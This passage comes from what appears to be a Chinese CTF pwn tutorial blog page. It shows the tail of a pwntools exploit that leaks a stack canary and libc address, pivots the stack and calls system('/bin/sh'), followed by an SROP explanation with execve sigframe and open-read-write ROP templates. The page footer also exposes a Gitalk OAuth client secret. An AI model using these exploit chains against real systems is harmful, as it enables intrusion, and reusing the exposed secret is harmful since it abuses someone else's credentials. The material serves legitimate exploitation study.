class="comment">#返回地址0x400630是start函数，或者可以用main函数地址</span></span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">48</span>+p64(cannay)+p64(stack_addr)+p64(leave_ret)</span><br><span class="line"><span class="comment">#构造栈迁移</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">puts_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">"puts_addr: "</span>+<span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc </span></span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"system_addr:"</span>+<span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_a =libc_base + <span class="number">0x18ce17</span><span class="comment">#"/bin/sh"的偏移地址</span></span><br><span class="line"><span class="comment">#leak again </span></span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">sh.send(<span class="string">'a'</span>*<span class="number">89</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"a"</span>*<span class="number">89</span>)</span><br><span class="line">cannay=u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">stack_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))-<span class="number">0x70</span> </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">"cannry: "</span>+<span class="built_in">hex</span>(cannay)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"stack_addr: "</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">payload=flat([stack_addr+<span class="number">0x60</span>,pop_rdi,binsh_a,system_addr,<span class="number">0x0400630</span>])</span><br><span class="line">payload+=<span class="string">'a'</span>*<span class="number">48</span>+p64(cannay)+p64(stack_addr)+p64(leave_ret)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>主要思路是利用第一次read泄露canary和旧rbp</p>
+<p>第二次read构造栈迁移，本来想多写点的，但是拿起题真的不知道该咋写了</p>
+<p>第一次看确实不好理解，还是要结合前面栈迁移的原理，自己动手做一下</p>
+<p>话说张老师已经开始让我写堆了，我却还在栈上纠结..</p>
+<h1 id="0x09-SROP"><a href="#0x09-SROP" class="headerlink" title="0x09 SROP"></a>0x09 SROP</h1><p><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/erh0l7#cS7rH">SROP</a></p>
+<p>SROP(Sigreturn Oriented Programming) ，其中，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。当系统进程发起（deliver）一个 signal 的时候，该进程会被短暂的挂起（suspend），进入内核①，然后内核对该进程保留相应的上下文，跳转到之前注册好的 signal handler 中处理 signal②，当 signal 返回后③，内核为进程恢复之前保留的上下文，恢复进程的执行④</p>
+<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" alt="Process of Signal Handlering"></p>
+<p>内核为进程保留相应的上下文的方法主要是：<strong>将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>，此时栈的情况是这样的：</p>
+<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/signal2-stack.png" alt="signal2-stack"></p>
+<p>我们<strong>称 ucontext 以及 siginfo 这一段为 signal frame</strong>，需要注意的是这一部分是在用户进程的地址空间，之后会跳转到注册过 signal handler 中处理相应的 signal，因此，当 signal handler 执行完成后就会<strong>执行 sigreturn 系统调用来恢复上下文，主要是将之前压入的寄存器的内容给还原回对应的寄存器</strong>，然后恢复进程的执行</p>
+<p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15</p>
+<p>假设攻击者可以控制用户进程的栈，那么它就可以伪造一个 Signal Frame，如下图所示，这里以 64 位为例子，给出 Signal Frame 更加详细的信息</p>
+<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-1.png" alt="signal2-stack"></p>
+<p>当系统执行完 sigreturn 系统调用之后，会执行一系列的 pop 指令以便于恢复相应寄存器的值，当执行到 rip 时，就会将程序执行流指向 syscall 地址，根据相应寄存器的值，此时，便会得到一个 shell。</p>
+<p>有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>
+<ul>
+<li><strong>控制栈指针。</strong></li>
+<li><strong>把原来 rip 指向的<code>syscall</code> gadget 换成<code>syscall; ret</code> gadget。</strong></li>
+</ul>
+<p>如下图所示 ，这样当每次 syscall 返回的时候，栈指针都会指向下一个 Signal Frame。因此就可以执行一系列的 sigreturn 函数调用。</p>
+<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/srop-example-2.png" alt="signal2-stack"></p>
+<p>rax = 15，执行syscall，便可将sigframe的值恢复。</p>
+<p>模板：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rax = constants.SYS_execve</span><br><span class="line">sigframe.rdi = stack_addr + <span class="number">0x120</span>  <span class="comment"># "/bin/sh" 's addr</span></span><br><span class="line">sigframe.rsi = <span class="number">0x0</span></span><br><span class="line">sigframe.rdx = <span class="number">0x0</span></span><br><span class="line">sigframe.rsp = stack_addr</span><br><span class="line">sigframe.rip = syscall_ret</span><br><span class="line">payload = p64(start_addr) + p64(syscall_ret) + <span class="built_in">str</span>(sigframe)</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://files.catbox.moe/fkrp1r.png" alt="image-20230526212409044"></p>
+<p>setcontext+53 + orw的利用，orw模板</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">orw  = p64(pop_rdi) + p64(FLAG)</span><br><span class="line">orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(pop_rdx) + p64(<span class="number">0x31</span>)</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(write)</span><br></pre></td></tr></tbody></table></figure>
+
+
+        </div>
+
+
+            <section class="post-copyright">
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://ld1ng.github.io/2020/07/01/canary/">https://ld1ng.github.io/2020/07/01/canary/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+		
+		<section class="post-tags">
+		<div>
+		<span>Tags: </span>
+		<span class="tag">
+		
+		
+		<!-- <a href="/tags/KNOWLEDGE/"># KNOWLEDGE</a> -->
+		<a href="/tags/KNOWLEDGE/">🏷️KNOWLEDGE</a>
+		
+		<!-- <a href="/tags/stack/"># stack</a> -->
+		<a href="/tags/stack/">🏷️stack</a>
+		
+		
+		</span>
+		</div>
+		<!-- 支持一下的按钮与图片 -->
+		<div class="reward" id="reward">
+		<div class="sponser">
+		<div class="sponser_btn">☕Buy Me a Coffee</div>
+		<div class="sponser_img">
+		<div class="sponser_container">
+	
+		<div class="alipay">
+		<span class="sponser_alipay_title"></span>
+		<div>
+		<img class="sponser_alipay" src="/image/Wechat.jpg">
+		</div>
+		</div>
+	
+		</div>
+		</div>
+		</div>
+		</div>
+		<div>
+		<a href="javascript:window.history.back();">Back</a>
+		<span>· </span>
+		<a href="/">Home</a>
+		</div>
+		</section>
+		
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/08/05/WMCTF/">WMCTF2020</a>
+            
+            
+            <a class="next" rel="next" href="/2020/06/20/Graduation/">观毕业季有感</a>
+            
+        </section>
+		
+
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '458a98372426d92cae5a',
+        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
+        repo: 'ld1ng.github.io',
+        owner: 'Ld1ng',
+        admin: 'Ld1ng',
+        id: md5(location.pathname),
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+
+    </article>
+</div>
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>Ld1ng🍕 © 2020 - 2026 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a><a></a>
+		
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<span class="site-pv">
+    | Visitors: 
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+</span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+<!-- 搜索功能 -->
+<!-- Chic/layout.ejs -->
+<div id="u-search">
+    <div class="modal">
+        <div class="modal-header">
+            <div class="container">
+                <form id="u-search-modal-form" class="u-search-modal-form">
+                    <button type="submit" class="form-submit-btn">
+                        <img src="/image/search.png" class="search-btn-img" />
+                    </button>
+                    <input placeholder="搜索内容..." class="form-input" id="modal-form-input">
+                </form>
+                <a class="modal-close">x</a>
+            </div>
+            <div class="search-loading">
+                <div class="search-loading-bar"></div>
+            </div>
+        </div>
+        <div class="modal-body">
+        </div>
+    </div>
+    <div class="modal-overlay"></div>
+</div>
+
+</html>
